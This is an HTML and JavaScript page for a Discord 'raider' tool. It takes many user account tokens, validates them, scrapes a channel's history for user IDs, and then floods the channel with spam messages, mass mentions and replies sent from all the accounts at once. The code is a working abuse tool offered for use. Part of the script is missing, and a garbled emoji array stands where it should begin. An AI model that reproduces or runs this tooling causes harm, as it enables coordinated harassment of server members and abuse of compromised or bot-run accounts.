<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Ikura raider lol</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Yu Gothic', 'Meiryo', sans-serif;
            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%);
            color: #5d5d5d;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.9);
            border: none;
            padding: 30px;
            border-radius: 30px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 850px;
        }
        h2 {
            text-align: center;
            color: #ff6b6b;
            letter-spacing: 2px;
            margin-bottom: 25px;
            font-weight: bold;
        }
        label {
            display: block;
            margin-top: 15px;
            font-size: 0.9em;
            color: #888;
            font-weight: bold;
            margin-left: 10px;
        }
        textarea, input, select {
            width: 100%;
            padding: 15px;
            border: 2px solid #ffe3e3;
            background: #fff;
            color: #555;
            border-radius: 20px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s;
        }
        textarea:focus, input:focus {
            border-color: #ffb1b1;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }
        .checkbox-group {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin: 20px 0;
            padding: 15px;
            background: #fff5f5;
            border-radius: 20px;
        }
        .checkbox-group label {
            display: flex;
            align-items: center;
            margin: 0;
            cursor: pointer;
            color: #ff8e8e;
        }
        input[type="checkbox"] {
            width: auto;
            margin-right: 8px;
            accent-color: #ff6b6b;
        }
        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
            margin-top: 10px;
            letter-spacing: 1px;
        }
        .btn-check {
            background: #fff;
            border: 2px solid #ffb1b1;
            color: #ffb1b1;
        }
        .btn-start {
            background: linear-gradient(to right, #ff6b6b, #ff8e8e);
            color: #fff;
            font-size: 1.1em;
            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
        }
        .btn-stop {
            background: #ddd;
            color: #fff;
            font-size: 1.1em;
        }
        button:hover {
            transform: translateY(-2px);
            filter: brightness(1.05);
        }
        #log {
            margin-top: 25px;
            height: 150px;
            overflow-y: auto;
            background: #fff;
            padding: 15px;
            font-size: 0.8em;
            border-radius: 20px;
            border: 2px solid #fff5f5;
            color: #777;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Ikura raider</h2>

    <label>Tokens (1 line per token)</label>
    <textarea id="tokens" placeholder="Enter tokens here..."></textarea>

    <div class="grid">
        <div>
            <label>Channel ID</label>
            <input type="text" id="channelId">
        </div>
        <div>
            <label>Delay (ms)</label>
            <input type="number" id="delay" value="1000">
        </div>
        <div>
            <label>Mention Count</label>
            <input type="number" id="mentionCount" value="1" min="1" max="10">
        </div>
    </div>

    <div class="checkbox-group">
        <label><input type="checkbox" id="enableRandomString" checked> Random String</label>
        <label><input type="checkbox" id="enableRandomMention"> Random Mention</label>
        <label><input type="checkbox" id="enableRandomReply"> Random Reply</label>
    </div>

    <label>Target User IDs (comma separated)</label>
    <textarea id="userIds" placeholder="User IDs..."></textarea>
    <button class="btn-check" onclick="getUser()">Get User</button>

    <label>Messages (comma separated)</label>
    <textarea id="messages" placeholder="raid by ikura lol"></textarea>

    <div class="grid">
        <button class="btn-check" onclick="checkTokens()">Check Tokens</button>
        <select id="mode" style="margin-top:10px;">
            <option value="1">Mode 1: Simultaneous</option>
            <option value="2">Mode 2: Sequential</option>
        </select>
    </div>

    <div class="grid" style="margin-top: 25px;">
        <button id="startBtn" class="btn-start" onclick="startRaiding()">Start</button>
        <button id="stopBtn" class="btn-stop" onclick="stopRaiding()" disabled>Stop</button>
    </div>

    <div id="log">ikura raider is ready lol</div>
</div>

", "рҹҳҘ", "рҹҳ“", "рҹӨ”", "рҹ§җ", "рҹӨЁ", "рҹҳҗ", "рҹҳ‘", "рҹҳ¶", "рҹ« ", "рҹӨҘ", "рҹҷ„", "рҹҳ¬", "рҹҳ®вҖҚрҹ’Ё", "рҹӨҘ", "рҹ«Ҙ", "рҹҳ¶вҖҚрҹҢ«пёҸ", "рҹҳҸ", "рҹҳ’", "рҹҷ„", "рҹҳ¬", "рҹҳ®вҖҚрҹ’Ё", "рҹӨҘ", "рҹ«Ҙ", "рҹӨЎ", "рҹ‘№", "рҹ‘ә", "рҹ‘»", "рҹ’Җ", "вҳ пёҸ", "рҹ‘Ҫ", "рҹ‘ҫ", "рҹӨ–", "рҹ’©", "рҹ‘ҝ", "рҹҳҲ", "рҹ‘ә", "рҹ‘№", "рҹ’Җ", "рҹ–Ө", "рҹ©¶", "рҹӨҚ", "рҹӨҺ", "вқӨпёҸвҖҚрҹ”Ҙ", "вқӨпёҸвҖҚрҹ©№", "рҹ’”", "вқЈпёҸ", "вқҢ", "вӯ•", "рҹӣ‘", "вӣ”", "рҹҡ«", "рҹ’ў", "вҡ пёҸ", "рҹҡ©", "рҹҸҒ", "рҹҸҙвҖҚвҳ пёҸ", "рҹ”ұ", "вҡңпёҸ", "гҖҪпёҸ", "вҡ пёҸ", "рҹҡё", "рҹ”°", "вҷ»пёҸ", "вң…", "вң”пёҸ", "вҳ‘пёҸ", "вң–пёҸ", "вһ•", "вһ–", "вһ—", "вһ°", "вһҝ", "гҖҪпёҸ", "вңіпёҸ", "вңҙпёҸ", "вқҮпёҸ", "вҖјпёҸ", "вҒүпёҸ", "вқ“", "вқ”", "вқ•", "вқ—", "гҖ°пёҸ", "гҖҪпёҸ", "вҡ пёҸ", "рҹҶҳ", "вҷЁпёҸ", "рҹ”•", "рҹ”Ү", "рҹ”Ҳ", "рҹ”Ү", "рҹ”ү", "рҹ”Ҡ", "рҹ””", "рҹ”•", "рҹ“Ј", "рҹ“ў"];

    async function getUser() {
        const tokenInput = document.getElementById('tokens').value;
        const token = tokenInput.split('\n')[0].trim();
        const cid = document.getElementById('channelId').value;
        if(!token || !cid) return alert("Check Token and Channel ID!");
        
        logger("Getting Users...");
        msgHistory = [];
        let lastId = null;
        let uids = new Set();
        try {
            for(let i=0; i<10; i++) {
                const url = `https://discord.com/api/v9/channels/${cid}/messages?limit=50${lastId ? `&before=${lastId}` : ''}`;
                const r = await fetch(url, { headers: { 'Authorization': token } });
                if (!r.ok) break;
                const data = await r.json();
                if(!data || !data.length) break;
                data.forEach(m => { msgHistory.push(m.id); uids.add(m.author.id); });
                lastId = data[data.length - 1].id;
                await new Promise(res => setTimeout(res, 300));
            }
            document.getElementById('userIds').value = Array.from(uids).join(',');
            logger(`Found ${uids.size} users!`);
        } catch(e) { logger("Error getting users."); }
    }

    function startRaiding() {
        if(isRunning) return;
        isRunning = true;
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        document.getElementById('stopBtn').style.background = "#ff6b6b";
        logger("Raid started.");
        runLoop();
    }

    function stopRaiding() {
        isRunning = false;
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        document.getElementById('stopBtn').style.background = "#ddd";
        logger("Raid stopped.");
    }

    async function runLoop() {
        while (isRunning) {
            const tks = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
            const cid = document.getElementById('channelId').value;
            const dlyInput = document.getElementById('delay').value;
            const dly = parseInt(dlyInput) || 1000;
            const md = document.getElementById('mode').value;
            const msgInput = document.getElementById('messages').value;
            const msgs = msgInput.split(',').filter(m => m.trim());
            const uids = document.getElementById('userIds').value.split(',').filter(u => u.trim());
            const mCount = parseInt(document.getElementById('mentionCount').value) || 1;

            if (tks.length === 0 || !cid) {
                logger("Error: Check Tokens/Channel ID.");
                stopRaiding();
                break;
            }

            const currentTasks = tks.map(async (t) => {
                if(!isRunning) return;
                
                let baseMsg = msgs.length > 0 ? msgs[Math.floor(Math.random() * msgs.length)].trim() : "raid by ikura lol";
                let content = baseMsg;
                
                if (document.getElementById('enableRandomString').checked) content += "\n" + genRandomString();
                
                if (document.getElementById('enableRandomMention').checked && uids.length > 0) {
                    content += "\n";
                    for(let i=0; i < mCount; i++) content += `<@${uids[Math.floor(Math.random() * uids.length)].trim()}> `;
                }
                
                let body = { content: content };
                if (document.getElementById('enableRandomReply').checked && msgHistory.length > 0) {
                    body.message_reference = { message_id: msgHistory[Math.floor(Math.random() * msgHistory.length)] };
                }

                try {
                    const response = await fetch(`https://discord.com/api/v9/channels/${cid}/messages`, {
                        method: 'POST',
                        headers: { 'Authorization': t.trim(), 'Content-Type': 'application/json' },
                        body: JSON.stringify(body)
                    });
                    if (response.status === 429) logger("Rate Limited (429)");
                } catch (e) {}
            });

            if (md === "1") {
                await Promise.all(currentTasks);
                await new Promise(r => setTimeout(r, dly));
            } else {
                for (const task of currentTasks) {
                    if(!isRunning) break;
                    await task;
                    await new Promise(r => setTimeout(r, Math.floor(dly / tks.length)));
                }
            }
        }
    }

    async function checkTokens() {
        const tks = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
        if(tks.length === 0) return alert("Enter tokens first.");
        logger("Checking tokens...");
        for (const t of tks) {
            try {
                const r = await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': t.trim() } });
                logger(r.ok ? `OK: ${t.substring(0,10)}...` : `NG: ${t.substring(0,10)}...`);
            } catch(e) { logger("CORS Error/Network Error"); }
        }
    }
</script>
